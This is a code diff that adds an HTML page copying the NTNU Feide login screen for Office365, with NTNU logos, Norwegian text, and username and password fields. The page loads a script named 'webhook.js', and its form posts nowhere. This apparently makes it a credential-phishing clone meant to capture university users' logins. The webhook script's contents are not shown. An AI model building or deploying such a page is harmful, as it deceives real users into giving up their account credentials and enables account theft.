@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script defer src="webhook.js"></script>
+    <title>Logg inn | NTNU</title>
+</head>
+<body>
+    <div id="card">
+        <div id="language">
+            Norsk (bokmål)
+        </div>
+        <div id="feideLoginInfo">
+            <img src="images/textlogo.png" alt="NTNU icon logo">
+            <p>
+                Du må logge inn med Feide <br>
+                for å få tilgang til Office365 for NTNU
+            </p>
+        </div>
+        <hr>
+        <div id="currentOrg">
+            <h4> Din organisasjon: </h4>
+            <div id="container">
+                <img src="images/logoicon.png" alt="NTNU text logo">
+                <section id="orgChangeSection">
+                    <h3>NTNU</h3>
+                    <h5>
+                        <a href="#">Endre organisasjon</a>
+                    </h5>
+                </section>
+            </div>
+        </div>
+        <hr>
+        <form action="#">
+            <label for="username">Brukernavn</label>
+            <br>
+            <input type="text" id="username">
+            <br>
+            <label for="password">Passord</label>
+            <br>
+            <input type="password" id="password">
+            <br>
+            <h4 id="message"><a href="https://i.ntnu.no/wiki/-/wiki/Norsk/brukernavn+og+passord">Får du ikke tilgang til kontoen?</a></h4>
+
+            <button type="submit" id="loginButton">Logg inn</button>
+        </form>
+    </div>  
+    <div class="gradient"></div>
+</body>
+</html>
